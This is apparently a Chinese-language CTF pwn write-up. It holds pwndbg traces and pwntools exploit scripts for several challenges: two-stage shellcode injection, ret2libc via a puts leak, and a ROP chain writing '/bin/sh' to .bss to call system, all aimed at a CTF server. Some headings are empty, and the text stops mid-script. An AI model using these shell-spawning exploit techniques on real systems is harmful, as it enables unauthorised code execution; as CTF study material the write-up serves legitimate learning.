   0x7f8da8849749 <read+121>    mov    dword ptr fs:[rdx], eax            [0x7f8da87436c8] <= 0x200
   0x7f8da884974c <read+124>    mov    rax, 0xffffffffffffffff            RAX => 0xffffffffffffffff
   0x7f8da8849753 <read+131>    ret                                <main+119>
    ↓
   0x5638c4102240 <main+119>    mov    rsi, qword ptr [rbp - 0x10]     RSI, [0x7ffdb3a241a0] => 0x7f8da8956000 ◂— 0
   0x5638c4102244 <main+123>    mov    rcx, rsi                        RCX => 0x7f8da8956000 ◂— 0
   0x5638c4102247 <main+126>    mov    rdx, 0x500                      RDX => 0x500
   0x5638c410224e <main+133>    mov    rax, 0                          RAX => 0
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp 0x7ffdb3a24198 —▸ 0x5638c4102240 (main+119) ◂— mov rsi, qword ptr [rbp - 0x10]
01:0008│-010 0x7ffdb3a241a0 —▸ 0x7f8da8956000 ◂— 0
02:0010│-008 0x7ffdb3a241a8 ◂— 0xca8ba5bd102a5400
03:0018│ rbp 0x7ffdb3a241b0 ◂— 1
04:0020│+008 0x7ffdb3a241b8 —▸ 0x7f8da876fd68 (__libc_start_call_main+120) ◂— mov edi, eax
05:0028│+010 0x7ffdb3a241c0 —▸ 0x7ffdb3a242b0 —▸ 0x7ffdb3a242b8 ◂— 0x38 /* '8' */
06:0030│+018 0x7ffdb3a241c8 —▸ 0x5638c41021c9 (main) ◂— endbr64 
07:0038│+020 0x7ffdb3a241d0 ◂— 0x1c4101040
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► 0   0x7f8da88496dd read+13
   1   0x5638c4102240 main+119
   2   0x7f8da876fd68 __libc_start_call_main+120
   3   0x7f8da876fe25 __libc_start_main+133
   4   0x5638c4102105 _start+37
────────────────────────────────────────────────────────────────────────────────
pwndbg> fin
Run till exit from #0  0x00007f8da88496dd in __GI___libc_read (fd=0, 
    buf=0x7f8da8956000, nbytes=2) at ../sysdeps/unix/sysv/linux/read.c:26
0x00005638c4102240 in main ()
Value returned is $1 = 2
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
*RAX  2
 RBX  0x7ffdb3a242c8 —▸ 0x7ffdb3a25951 ◂— './attachment'
 RCX  0x7f8da88496dd (read+13) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  2
 RDI  0
 RSI  0x7f8da8956000 ◂— 0x50f
 R8   0xffffffff
 R9   0
 R10  0x22
 R11  0x246
 R12  0
 R13  0x7ffdb3a242d8 —▸ 0x7ffdb3a2595e ◂— 'XDG_GREETER_DATA_DIR=/var/lib/lightdm/data/kali'
 R14  0x7f8da8994000 (_rtld_global) —▸ 0x7f8da89952e0 —▸ 0x5638c4101000 ◂— 0x10102464c457f
 R15  0x5638c4104da0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5638c4102180 (__do_global_dtors_aux) ◂— endbr64 
 RBP  0x7ffdb3a241b0 ◂— 1
*RSP  0x7ffdb3a241a0 —▸ 0x7f8da8956000 ◂— 0x50f
*RIP  0x5638c4102240 (main+119) ◂— mov rsi, qword ptr [rbp - 0x10]
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
   0x7f8da8849740 <read+112>    mov    rdx, qword ptr [rip + 0xe36b9]     RDX, [_GLOBAL_OFFSET_TABLE_+640] => 0xffffffffffffff88
   0x7f8da8849747 <read+119>    neg    eax
   0x7f8da8849749 <read+121>    mov    dword ptr fs:[rdx], eax            [0x7f8da87436c8] <= 0x200
   0x7f8da884974c <read+124>    mov    rax, 0xffffffffffffffff            RAX => 0xffffffffffffffff
   0x7f8da8849753 <read+131>    ret                                <main+119>
    ↓
 ► 0x5638c4102240 <main+119>    mov    rsi, qword ptr [rbp - 0x10]     RSI, [0x7ffdb3a241a0] => 0x7f8da8956000 ◂— 0x50f
   0x5638c4102244 <main+123>    mov    rcx, rsi                        RCX => 0x7f8da8956000 ◂— 0x50f
   0x5638c4102247 <main+126>    mov    rdx, 0x500                      RDX => 0x500
   0x5638c410224e <main+133>    mov    rax, 0                          RAX => 0
   0x5638c4102255 <main+140>    call   rcx                         <0x7f8da8956000>

   0x5638c4102257 <main+142>    mov    rax, qword ptr [rbp - 0x10]
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp 0x7ffdb3a241a0 —▸ 0x7f8da8956000 ◂— 0x50f
01:0008│-008 0x7ffdb3a241a8 ◂— 0xca8ba5bd102a5400
02:0010│ rbp 0x7ffdb3a241b0 ◂— 1
03:0018│+008 0x7ffdb3a241b8 —▸ 0x7f8da876fd68 (__libc_start_call_main+120) ◂— mov edi, eax
04:0020│+010 0x7ffdb3a241c0 —▸ 0x7ffdb3a242b0 —▸ 0x7ffdb3a242b8 ◂— 0x38 /* '8' */
05:0028│+018 0x7ffdb3a241c8 —▸ 0x5638c41021c9 (main) ◂— endbr64 
06:0030│+020 0x7ffdb3a241d0 ◂— 0x1c4101040
07:0038│+028 0x7ffdb3a241d8 —▸ 0x7ffdb3a242c8 —▸ 0x7ffdb3a25951 ◂— './attachment'
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► 0   0x5638c4102240 main+119
   1   0x7f8da876fd68 __libc_start_call_main+120
   2   0x7f8da876fe25 __libc_start_main+133
   3   0x5638c4102105 _start+37
────────────────────────────────────────────────────────────────────────────────
pwndbg> ni
0x00005638c4102244 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
 RAX  2
 RBX  0x7ffdb3a242c8 —▸ 0x7ffdb3a25951 ◂— './attachment'
 RCX  0x7f8da88496dd (read+13) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  2
 RDI  0
 RSI  0x7f8da8956000 ◂— 0x50f
 R8   0xffffffff
 R9   0
 R10  0x22
 R11  0x246
 R12  0
 R13  0x7ffdb3a242d8 —▸ 0x7ffdb3a2595e ◂— 'XDG_GREETER_DATA_DIR=/var/lib/lightdm/data/kali'
 R14  0x7f8da8994000 (_rtld_global) —▸ 0x7f8da89952e0 —▸ 0x5638c4101000 ◂— 0x10102464c457f
 R15  0x5638c4104da0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5638c4102180 (__do_global_dtors_aux) ◂— endbr64 
 RBP  0x7ffdb3a241b0 ◂— 1
 RSP  0x7ffdb3a241a0 —▸ 0x7f8da8956000 ◂— 0x50f
*RIP  0x5638c4102244 (main+123) ◂— mov rcx, rsi
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
   0x7f8da8849747 <read+119>    neg    eax
   0x7f8da8849749 <read+121>    mov    dword ptr fs:[rdx], eax     [0x7f8da87436c8] <= 0x200
   0x7f8da884974c <read+124>    mov    rax, 0xffffffffffffffff     RAX => 0xffffffffffffffff
   0x7f8da8849753 <read+131>    ret                                <main+119>
    ↓
   0x5638c4102240 <main+119>    mov    rsi, qword ptr [rbp - 0x10]     RSI, [0x7ffdb3a241a0] => 0x7f8da8956000 ◂— 0x50f
 ► 0x5638c4102244 <main+123>    mov    rcx, rsi                        RCX => 0x7f8da8956000 ◂— 0x50f
   0x5638c4102247 <main+126>    mov    rdx, 0x500                      RDX => 0x500
   0x5638c410224e <main+133>    mov    rax, 0                          RAX => 0
   0x5638c4102255 <main+140>    call   rcx                         <0x7f8da8956000>

   0x5638c4102257 <main+142>    mov    rax, qword ptr [rbp - 0x10]
   0x5638c410225b <main+146>    mov    esi, 0x1000                     ESI => 0x1000
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp 0x7ffdb3a241a0 —▸ 0x7f8da8956000 ◂— 0x50f
01:0008│-008 0x7ffdb3a241a8 ◂— 0xca8ba5bd102a5400
02:0010│ rbp 0x7ffdb3a241b0 ◂— 1
03:0018│+008 0x7ffdb3a241b8 —▸ 0x7f8da876fd68 (__libc_start_call_main+120) ◂— mov edi, eax
04:0020│+010 0x7ffdb3a241c0 —▸ 0x7ffdb3a242b0 —▸ 0x7ffdb3a242b8 ◂— 0x38 /* '8' */
05:0028│+018 0x7ffdb3a241c8 —▸ 0x5638c41021c9 (main) ◂— endbr64 
06:0030│+020 0x7ffdb3a241d0 ◂— 0x1c4101040
07:0038│+028 0x7ffdb3a241d8 —▸ 0x7ffdb3a242c8 —▸ 0x7ffdb3a25951 ◂— './attachment'
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► 0   0x5638c4102244 main+123
   1   0x7f8da876fd68 __libc_start_call_main+120
   2   0x7f8da876fe25 __libc_start_main+133
   3   0x5638c4102105 _start+37
────────────────────────────────────────────────────────────────────────────────
pwndbg> 
0x00005638c4102247 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
 RAX  2
 RBX  0x7ffdb3a242c8 —▸ 0x7ffdb3a25951 ◂— './attachment'
*RCX  0x7f8da8956000 ◂— 0x50f
 RDX  2
 RDI  0
 RSI  0x7f8da8956000 ◂— 0x50f
 R8   0xffffffff
 R9   0
 R10  0x22
 R11  0x246
 R12  0
 R13  0x7ffdb3a242d8 —▸ 0x7ffdb3a2595e ◂— 'XDG_GREETER_DATA_DIR=/var/lib/lightdm/data/kali'
 R14  0x7f8da8994000 (_rtld_global) —▸ 0x7f8da89952e0 —▸ 0x5638c4101000 ◂— 0x10102464c457f
 R15  0x5638c4104da0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5638c4102180 (__do_global_dtors_aux) ◂— endbr64 
 RBP  0x7ffdb3a241b0 ◂— 1
 RSP  0x7ffdb3a241a0 —▸ 0x7f8da8956000 ◂— 0x50f
*RIP  0x5638c4102247 (main+126) ◂— mov rdx, 0x500
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
   0x7f8da8849749 <read+121>    mov    dword ptr fs:[rdx], eax     [0x7f8da87436c8] <= 0x200
   0x7f8da884974c <read+124>    mov    rax, 0xffffffffffffffff     RAX => 0xffffffffffffffff
   0x7f8da8849753 <read+131>    ret                                <main+119>
    ↓
   0x5638c4102240 <main+119>    mov    rsi, qword ptr [rbp - 0x10]     RSI, [0x7ffdb3a241a0] => 0x7f8da8956000 ◂— 0x50f
   0x5638c4102244 <main+123>    mov    rcx, rsi                        RCX => 0x7f8da8956000 ◂— 0x50f
 ► 0x5638c4102247 <main+126>    mov    rdx, 0x500                      RDX => 0x500
   0x5638c410224e <main+133>    mov    rax, 0                          RAX => 0
   0x5638c4102255 <main+140>    call   rcx                         <0x7f8da8956000>

   0x5638c4102257 <main+142>    mov    rax, qword ptr [rbp - 0x10]
   0x5638c410225b <main+146>    mov    esi, 0x1000                     ESI => 0x1000
   0x5638c4102260 <main+151>    mov    rdi, rax
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp 0x7ffdb3a241a0 —▸ 0x7f8da8956000 ◂— 0x50f
01:0008│-008 0x7ffdb3a241a8 ◂— 0xca8ba5bd102a5400
02:0010│ rbp 0x7ffdb3a241b0 ◂— 1
03:0018│+008 0x7ffdb3a241b8 —▸ 0x7f8da876fd68 (__libc_start_call_main+120) ◂— mov edi, eax
04:0020│+010 0x7ffdb3a241c0 —▸ 0x7ffdb3a242b0 —▸ 0x7ffdb3a242b8 ◂— 0x38 /* '8' */
05:0028│+018 0x7ffdb3a241c8 —▸ 0x5638c41021c9 (main) ◂— endbr64 
06:0030│+020 0x7ffdb3a241d0 ◂— 0x1c4101040
07:0038│+028 0x7ffdb3a241d8 —▸ 0x7ffdb3a242c8 —▸ 0x7ffdb3a25951 ◂— './attachment'
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► 0   0x5638c4102247 main+126
   1   0x7f8da876fd68 __libc_start_call_main+120
   2   0x7f8da876fe25 __libc_start_main+133
   3   0x5638c4102105 _start+37
────────────────────────────────────────────────────────────────────────────────
pwndbg> 
0x00005638c410224e in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
 RAX  2
 RBX  0x7ffdb3a242c8 —▸ 0x7ffdb3a25951 ◂— './attachment'
 RCX  0x7f8da8956000 ◂— 0x50f
*RDX  0x500
 RDI  0
 RSI  0x7f8da8956000 ◂— 0x50f
 R8   0xffffffff
 R9   0
 R10  0x22
 R11  0x246
 R12  0
 R13  0x7ffdb3a242d8 —▸ 0x7ffdb3a2595e ◂— 'XDG_GREETER_DATA_DIR=/var/lib/lightdm/data/kali'
 R14  0x7f8da8994000 (_rtld_global) —▸ 0x7f8da89952e0 —▸ 0x5638c4101000 ◂— 0x10102464c457f
 R15  0x5638c4104da0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5638c4102180 (__do_global_dtors_aux) ◂— endbr64 
 RBP  0x7ffdb3a241b0 ◂— 1
 RSP  0x7ffdb3a241a0 —▸ 0x7f8da8956000 ◂— 0x50f
*RIP  0x5638c410224e (main+133) ◂— mov rax, 0
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
   0x7f8da884974c <read+124>    mov    rax, 0xffffffffffffffff     RAX => 0xffffffffffffffff
   0x7f8da8849753 <read+131>    ret                                <main+119>
    ↓
   0x5638c4102240 <main+119>    mov    rsi, qword ptr [rbp - 0x10]     RSI, [0x7ffdb3a241a0] => 0x7f8da8956000 ◂— 0x50f
   0x5638c4102244 <main+123>    mov    rcx, rsi                        RCX => 0x7f8da8956000 ◂— 0x50f
   0x5638c4102247 <main+126>    mov    rdx, 0x500                      RDX => 0x500
 ► 0x5638c410224e <main+133>    mov    rax, 0                          RAX => 0
   0x5638c4102255 <main+140>    call   rcx                         <0x7f8da8956000>

   0x5638c4102257 <main+142>    mov    rax, qword ptr [rbp - 0x10]
   0x5638c410225b <main+146>    mov    esi, 0x1000                     ESI => 0x1000
   0x5638c4102260 <main+151>    mov    rdi, rax
   0x5638c4102263 <main+154>    call   munmap@plt                  <munmap@plt>
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp 0x7ffdb3a241a0 —▸ 0x7f8da8956000 ◂— 0x50f
01:0008│-008 0x7ffdb3a241a8 ◂— 0xca8ba5bd102a5400
02:0010│ rbp 0x7ffdb3a241b0 ◂— 1
03:0018│+008 0x7ffdb3a241b8 —▸ 0x7f8da876fd68 (__libc_start_call_main+120) ◂— mov edi, eax
04:0020│+010 0x7ffdb3a241c0 —▸ 0x7ffdb3a242b0 —▸ 0x7ffdb3a242b8 ◂— 0x38 /* '8' */
05:0028│+018 0x7ffdb3a241c8 —▸ 0x5638c41021c9 (main) ◂— endbr64 
06:0030│+020 0x7ffdb3a241d0 ◂— 0x1c4101040
07:0038│+028 0x7ffdb3a241d8 —▸ 0x7ffdb3a242c8 —▸ 0x7ffdb3a25951 ◂— './attachment'
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► 0   0x5638c410224e main+133
   1   0x7f8da876fd68 __libc_start_call_main+120
   2   0x7f8da876fe25 __libc_start_main+133
   3   0x5638c4102105 _start+37
────────────────────────────────────────────────────────────────────────────────
pwndbg> 
0x00005638c4102255 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
*RAX  0
 RBX  0x7ffdb3a242c8 —▸ 0x7ffdb3a25951 ◂— './attachment'
 RCX  0x7f8da8956000 ◂— 0x50f
 RDX  0x500
 RDI  0
 RSI  0x7f8da8956000 ◂— 0x50f
 R8   0xffffffff
 R9   0
 R10  0x22
 R11  0x246
 R12  0
 R13  0x7ffdb3a242d8 —▸ 0x7ffdb3a2595e ◂— 'XDG_GREETER_DATA_DIR=/var/lib/lightdm/data/kali'
 R14  0x7f8da8994000 (_rtld_global) —▸ 0x7f8da89952e0 —▸ 0x5638c4101000 ◂— 0x10102464c457f
 R15  0x5638c4104da0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5638c4102180 (__do_global_dtors_aux) ◂— endbr64 
 RBP  0x7ffdb3a241b0 ◂— 1
 RSP  0x7ffdb3a241a0 —▸ 0x7f8da8956000 ◂— 0x50f
*RIP  0x5638c4102255 (main+140) ◂— call rcx
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
   0x7f8da8849753 <read+131>    ret                                <main+119>
    ↓
   0x5638c4102240 <main+119>    mov    rsi, qword ptr [rbp - 0x10]     RSI, [0x7ffdb3a241a0] => 0x7f8da8956000 ◂— 0x50f
   0x5638c4102244 <main+123>    mov    rcx, rsi                        RCX => 0x7f8da8956000 ◂— 0x50f
   0x5638c4102247 <main+126>    mov    rdx, 0x500                      RDX => 0x500
   0x5638c410224e <main+133>    mov    rax, 0                          RAX => 0
 ► 0x5638c4102255 <main+140>    call   rcx                         <0x7f8da8956000>

   0x5638c4102257 <main+142>    mov    rax, qword ptr [rbp - 0x10]
   0x5638c410225b <main+146>    mov    esi, 0x1000                     ESI => 0x1000
   0x5638c4102260 <main+151>    mov    rdi, rax
   0x5638c4102263 <main+154>    call   munmap@plt                  <munmap@plt>

   0x5638c4102268 <main+159>    cmp    eax, -1
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp 0x7ffdb3a241a0 —▸ 0x7f8da8956000 ◂— 0x50f
01:0008│-008 0x7ffdb3a241a8 ◂— 0xca8ba5bd102a5400
02:0010│ rbp 0x7ffdb3a241b0 ◂— 1
03:0018│+008 0x7ffdb3a241b8 —▸ 0x7f8da876fd68 (__libc_start_call_main+120) ◂— mov edi, eax
04:0020│+010 0x7ffdb3a241c0 —▸ 0x7ffdb3a242b0 —▸ 0x7ffdb3a242b8 ◂— 0x38 /* '8' */
05:0028│+018 0x7ffdb3a241c8 —▸ 0x5638c41021c9 (main) ◂— endbr64 
06:0030│+020 0x7ffdb3a241d0 ◂— 0x1c4101040
07:0038│+028 0x7ffdb3a241d8 —▸ 0x7ffdb3a242c8 —▸ 0x7ffdb3a25951 ◂— './attachment'
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► 0   0x5638c4102255 main+140
   1   0x7f8da876fd68 __libc_start_call_main+120
   2   0x7f8da876fe25 __libc_start_main+133
   3   0x5638c4102105 _start+37
────────────────────────────────────────────────────────────────────────────────
pwndbg> s
0x00007f8da8956000 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
 RAX  0
 RBX  0x7ffdb3a242c8 —▸ 0x7ffdb3a25951 ◂— './attachment'
 RCX  0x7f8da8956000 ◂— 0x50f
 RDX  0x500
 RDI  0
 RSI  0x7f8da8956000 ◂— 0x50f
 R8   0xffffffff
 R9   0
 R10  0x22
 R11  0x246
 R12  0
 R13  0x7ffdb3a242d8 —▸ 0x7ffdb3a2595e ◂— 'XDG_GREETER_DATA_DIR=/var/lib/lightdm/data/kali'
 R14  0x7f8da8994000 (_rtld_global) —▸ 0x7f8da89952e0 —▸ 0x5638c4101000 ◂— 0x10102464c457f
 R15  0x5638c4104da0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5638c4102180 (__do_global_dtors_aux) ◂— endbr64 
 RBP  0x7ffdb3a241b0 ◂— 1
*RSP  0x7ffdb3a24198 —▸ 0x5638c4102257 (main+142) ◂— mov rax, qword ptr [rbp - 0x10]
*RIP  0x7f8da8956000 ◂— 0x50f
──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
 ► 0x7f8da8956000    syscall  <SYS_read>
        fd: 0 (pipe:[214863])
        buf: 0x7f8da8956000 ◂— 0x50f
        nbytes: 0x500
   0x7f8da8956002    add    byte ptr [rax], al
   0x7f8da8956004    add    byte ptr [rax], al
   0x7f8da8956006    add    byte ptr [rax], al
   0x7f8da8956008    add    byte ptr [rax], al
   0x7f8da895600a    add    byte ptr [rax], al
   0x7f8da895600c    add    byte ptr [rax], al
   0x7f8da895600e    add    byte ptr [rax], al
   0x7f8da8956010    add    byte ptr [rax], al
   0x7f8da8956012    add    byte ptr [rax], al
   0x7f8da8956014    add    byte ptr [rax], al
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp 0x7ffdb3a24198 —▸ 0x5638c4102257 (main+142) ◂— mov rax, qword ptr [rbp - 0x10]
01:0008│-010 0x7ffdb3a241a0 —▸ 0x7f8da8956000 ◂— 0x50f
02:0010│-008 0x7ffdb3a241a8 ◂— 0xca8ba5bd102a5400
03:0018│ rbp 0x7ffdb3a241b0 ◂— 1
04:0020│+008 0x7ffdb3a241b8 —▸ 0x7f8da876fd68 (__libc_start_call_main+120) ◂— mov edi, eax
05:0028│+010 0x7ffdb3a241c0 —▸ 0x7ffdb3a242b0 —▸ 0x7ffdb3a242b8 ◂— 0x38 /* '8' */
06:0030│+018 0x7ffdb3a241c8 —▸ 0x5638c41021c9 (main) ◂— endbr64 
07:0038│+020 0x7ffdb3a241d0 ◂— 0x1c4101040
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► 0   0x7f8da8956000 None
   1   0x5638c4102257 main+142
   2   0x7f8da876fd68 __libc_start_call_main+120
   3   0x7f8da876fe25 __libc_start_main+133
pwndbg> 
```

 ► 0x5638c4102255 <main+140>    call   rcx                         <0x7f8da8956000>

这个地方就是步进call rcx指令了

对应的就是buf区段内容的一个执行

这个时候对应的寄存器的数据是：

```c
*RAX  0
 RBX  0x7ffdb3a242c8 —▸ 0x7ffdb3a25951 ◂— './attachment'
 RCX  0x7f8da8956000 ◂— 0x50f
 RDX  0x500
 RDI  0
 RSI  0x7f8da8956000 ◂— 0x50f
 R8   0xffffffff
 R9   0
 R10  0x22
 R11  0x246
 R12  0
 R13  0x7ffdb3a242d8 —▸ 0x7ffdb3a2595e ◂— 'XDG_GREETER_DATA_DIR=/var/lib/lightdm/data/kali'
 R14  0x7f8da8994000 (_rtld_global) —▸ 0x7f8da89952e0 —▸ 0x5638c4101000 ◂— 0x10102464c457f
 R15  0x5638c4104da0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5638c4102180 (__do_global_dtors_aux) ◂— endbr64 
 RBP  0x7ffdb3a241b0 ◂— 1
 RSP  0x7ffdb3a241a0 —▸ 0x7f8da8956000 ◂— 0x50f
*RIP  0x5638c4102255 (main+140) ◂— call rcx
```

在x86的系统调用中，rax为0时，相当于进行的是一个sys_read

详见：

[Linux系统调用表（64位）_系统调用号表-CSDN博客](https://blog.csdn.net/SUKI547/article/details/103315487)



用s进行步入也能看到

► 0x7f8da8956000    syscall  <SYS_read>
        fd: 0 (pipe:[214863])
        buf: 0x7f8da8956000 ◂— 0x50f
        nbytes: 0x500



这里就说明是在进行一个sys_read了

实际上就是buf区等价于一个

read(0,buf,0x500)

0是代表标准读入，所以实际上就是有两次传入的机会

但第一次只能传入两字节

第二次才充裕

所以第一次我们需要传入一个两字节的syscall进去

而且由于需要buf内容里出现了syscall，在出现((void (__fastcall *)(_QWORD, void *, __int64))buf)(0LL, buf, 1280LL);后，buf内容作为函数的效果才会显现

如果第一次传入内容就是垃圾数据，进程就会直接崩溃

只有一开始就传入两个字节的syscall才能使((void (__fastcall *)(_QWORD, void *, __int64))buf)(0LL, buf, 1280LL);等价变成sys_read

但如果，buf一开始被syscall占据了两字节，所以就还得在第二次传入时，将那两个第一次传入的字节给覆盖掉

这里exp使用的是用nop来覆盖，实际上用b'a' *(2)也是可以的

```python
from pwn import *
#p = process('./attachment')
p = remote("gz.imxbt.cn",20384)
context.arch='amd64'

# gdb.attach(p,'b $rebase(0x1255)')

shellcode = asm("syscall") # 即'\x0f\x05'
p.send(shellcode)

shellcode = b'\x90'*2 + asm(shellcraft.sh()) # '\x90'为nop的汇编，覆盖掉之前的syscall
p.send(shellcode)

p.interactive()
```







### stack_in_stack







### 五子棋   （t1d）









### 你为什么不让我溢出   （gets✌）

checksec

```c
[*] 'C:\\Users\\26597\\Desktop\\pwn附件\\你为什么不让我溢出'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```







### 她与你皆失   （gets✌）

原本想尝试传入shellcode的

但是交互很奇怪

先[*] Switching to interactive mode

然后才出main函数会输出的内容

输入一个单指令就会直接EOF

所以最后还是选择了老老实实去打r2libc

exp：

```python
from pwn import *
from LibcSearcher import *

io = remote('gz.imxbt.cn',20283)
# io=process("./pwn")
elf = ELF('./pwn')
libc= ELF('./libc.so.6')

ret_add =0x000000000040101a
pop_rdi =0x0000000000401176
main_add =0x00000000004011DF
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

print("Puts_got: ",hex(puts_got))
print("Puts_plt: ",hex(puts_plt))

offset=0xa

payload1 = b'a' * (offset+8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_add)
io.sendlineafter(b'do?', payload1)
puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print("Puts_addr: ",hex(puts_addr))

# libc = LibcSearcher('puts',puts_addr)   # libc6_2.27-0ubuntu2_amd64
#
# libc_base = puts_addr - libc.dump('puts')
# system_add = libc_base + libc.dump('system')
# bin_sh_add = libc_base + libc.dump('str_bin_sh')

libc_base = puts_addr - libc.symbols['puts']
system_add = libc_base + libc.symbols['system']
bin_sh_add = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'a' * (offset+8) + p64(ret_add) + p64(pop_rdi) + p64(bin_sh_add) + p64(system_add)

io.sendlineafter(b'do?', payload2)

io.interactive()
```





### 彻底失去她   （gets✌）

checksec

64位

main：

```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[10]; // [rsp+6h] [rbp-Ah] BYREF

  init();
  puts("Thank you for helping me find her.");
  puts("But she has left me for good this time, what should I do?");
  puts("By the way, I still don't know your name, could you tell me your name?");
  read(0, buf, 0x100uLL);
  return 0;
}
```

没找到/bin/sh

那只能传进去了

有看到system函数

```c
int present()
{
  return system("ls");
}
```

找到system函数地址

ROPgadget 找找前三个寄存器

rdi，rsi，rdx

通过传参，写入bss段就好了

```c
.bss:00000000004040A0                 public buffer
.bss:00000000004040A0 buffer          db    ? ;
.bss:00000000004040A1                 db    ? ;
.bss:00000000004040A2                 db    ? ;
.bss:00000000004040A3                 db    ? ;
.bss:00000000004040A4                 db    ? ;
.bss:00000000004040A5                 db    ? ;
.bss:00000000004040A6                 db    ? ;
.bss:00000000004040A7                 db    ? ;
.bss:00000000004040A8                 db    ? ;
.bss:00000000004040A9                 db    ? ;
.bss:00000000004040AA                 db    ? ;
.bss:00000000004040AB                 db    ? ;
.bss:00000000004040AC                 db    ? ;
.bss:00000000004040AD                 db    ? ;
.bss:00000000004040AE                 db    ? ;
.bss:00000000004040AF                 db    ? ;
.bss:00000000004040B0                 db    ? ;
.bss:00000000004040B1                 db    ? ;
.bss:00000000004040B2                 db    ? ;
.bss:00000000004040B3                 db    ? ;
.bss:00000000004040B4                 db    ? ;
.bss:00000000004040B5                 db    ? ;
.bss:00000000004040B6                 db    ? ;
.bss:00000000004040B7                 db    ? ;
.bss:00000000004040B8                 db    ? ;
.bss:00000000004040B9                 db    ? ;
.bss:00000000004040BA                 db    ? ;
.bss:00000000004040BB                 db    ? ;
.bss:00000000004040BC                 db    ? ;
.bss:00000000004040BD                 db    ? ;
.bss:00000000004040BE                 db    ? ;
.bss:00000000004040BF                 db    ? ;
.bss:00000000004040C0                 db    ? ;
.bss:00000000004040C1                 db    ? ;
.bss:00000000004040C2                 db    ? ;
.bss:00000000004040C3                 db    ? ;
.bss:00000000004040C4                 db    ? ;
.bss:00000000004040C5                 db    ? ;
.bss:00000000004040C6                 db    ? ;
.bss:00000000004040C7                 db    ? ;
.bss:00000000004040C8                 db    ? ;
.bss:00000000004040C9                 db    ? ;
.bss:00000000004040CA                 db    ? ;
.bss:00000000004040CB                 db    ? ;
.bss:00000000004040CC                 db    ? ;
.bss:00000000004040CD                 db    ? ;
.bss:00000000004040CE                 db    ? ;
.bss:00000000004040CF                 db    ? ;
.bss:00000000004040D0                 db    ? ;
.bss:00000000004040D1                 db    ? ;
.bss:00000000004040D2                 db    ? ;
.bss:00000000004040D3                 db    ? ;
.bss:00000000004040D4                 db    ? ;
.bss:00000000004040D5                 db    ? ;
.bss:00000000004040D6                 db    ? ;
.bss:00000000004040D7                 db    ? ;
.bss:00000000004040D7 _bss            ends
.bss:00000000004040D7
```

写入后，再弄上一个read函数

三个寄存器一次传参，成为新构造的read函数的参数

然后再利用这个read读取传入的/bin/sh

（read函数和system函数利用elf.plt['函数名']这个方法更快，避免找不到，找了老半天的菜鸡如是说）

```python
from pwn import *

p = remote("gz.imxbt.cn",20291)
# p = process('./彻底失去她')
rdi = 0x0000000000401196
rsi = 0x00000000004011ad
rdx = 0x0000000000401265
ret = 0x000000000040101a
offset = 0xa+8
buf = 0x00000000004040A0
system = 0x000000000401080
read = 0x0000000000401090


payload = b'a' * (0xa + 8)
payload += p64(rdi) + p64(0)
payload += p64(rsi) + p64(buf)
payload += p64(rdx) + p64(0x10)
payload += p64(read)  # read(0, buf, 0x10)
payload += p64(rdi) + p64(buf) + p64(system)
p.sendline(payload)
p.sendline(b'/bin/sh\x00')
p.interactive()
```







### 我把她丢了   （gets✌）

checksec

```c
[*] 'C:\\Users\\26597\\Desktop\\pwn附件\\我把她丢了'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

普通64位栈溢出

有提权字符

vuln函数存在栈溢出漏洞

需要填充的数据长度得知

用ELFplt["system"]方法找真实system地址

```python
from pwn import *
